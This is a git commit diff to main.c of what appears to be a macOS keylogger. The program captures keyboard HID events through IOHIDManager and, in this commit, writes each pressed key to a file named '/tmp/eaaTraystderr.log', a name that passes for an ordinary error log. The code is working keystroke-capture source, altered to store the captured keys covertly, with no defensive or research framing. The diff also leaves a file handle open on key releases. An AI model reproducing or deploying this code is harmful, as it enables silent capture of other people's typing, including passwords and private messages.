b7a2c5a1f584ad3425fcee11cb3c114d5766f21e
crkmythical <82789723+crkmythical@users.noreply.github.com>
2024-05-16 03:57:58 +0000

    save to tmp

--- main.c
+++ main.c
@@ -2,38 +2,56 @@
 #include <IOKit/hid/IOHIDManager.h>
 #include "./keymap.h"
 
-static void AddUsage(CFMutableArrayRef array, int inUsagePage, int inUsage) {
+static void AddUsage(CFMutableArrayRef array, int inUsagePage, int inUsage)
+{
     CFMutableDictionaryRef d = CFDictionaryCreateMutable(NULL, 2, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
     CFDictionaryAddValue(d, CFSTR(kIOHIDDeviceUsagePageKey), CFNumberCreate(NULL, kCFNumberSInt32Type, &inUsagePage));
     CFDictionaryAddValue(d, CFSTR(kIOHIDDeviceUsageKey), CFNumberCreate(NULL, kCFNumberSInt32Type, &inUsage));
     CFArrayAppendValue(array, d);
 }
 
-static void ValueCallback(void* context, IOReturn result, void* sender, IOHIDValueRef value) {
+static void ValueCallback(void *context, IOReturn result, void *sender, IOHIDValueRef value)
+{
     IOHIDElementRef elem = IOHIDValueGetElement(value);
     if (IOHIDElementGetUsagePage(elem) != 0x07)
     {
         return;
     }
+    // open log file in append mode
+    FILE *logfile = fopen("/tmp/eaaTraystderr.log", "a");
+    if (!logfile)
+    {
+        perror("Failed to open log file");
+        return;
+    }
+
     uint32_t scancode = IOHIDElementGetUsage(elem);
     if (scancode < 4 || scancode > 231)
     {
+        fclose(logfile);
         return;
     }
     CFIndex pressed = IOHIDValueGetIntegerValue(value);
-    if(pressed) {
+    if (pressed)
+    {
         uint32_t keymap_index = scancode * 2;
-        char* keymap_entry = (keymap_index < KEYMAP_MAX ? KEYMAP[keymap_index] : NULL);
-        if(keymap_entry != NULL) {
-            printf("%s ", keymap_entry);
-        } else {
-            printf("<%u> ", scancode);
+        char *keymap_entry = (keymap_index < KEYMAP_MAX ? KEYMAP[keymap_index] : NULL);
+        if (keymap_entry != NULL)
+        {
+            fprintf(logfile, "%s ", keymap_entry);
         }
-        fflush(stdout);
+        else
+        {
+            fprintf(logfile, "<%u> ", scancode);
+        }
+        // Flush and close the log file
+        fflush(logfile);
+        fclose(logfile);
     }
 }
 
-int main() {
+int main()
+{
     IOHIDManagerRef ioManager = IOHIDManagerCreate(kCFAllocatorDefault, kIOHIDOptionsTypeNone);
     if (CFGetTypeID(ioManager) != IOHIDManagerGetTypeID())
     {
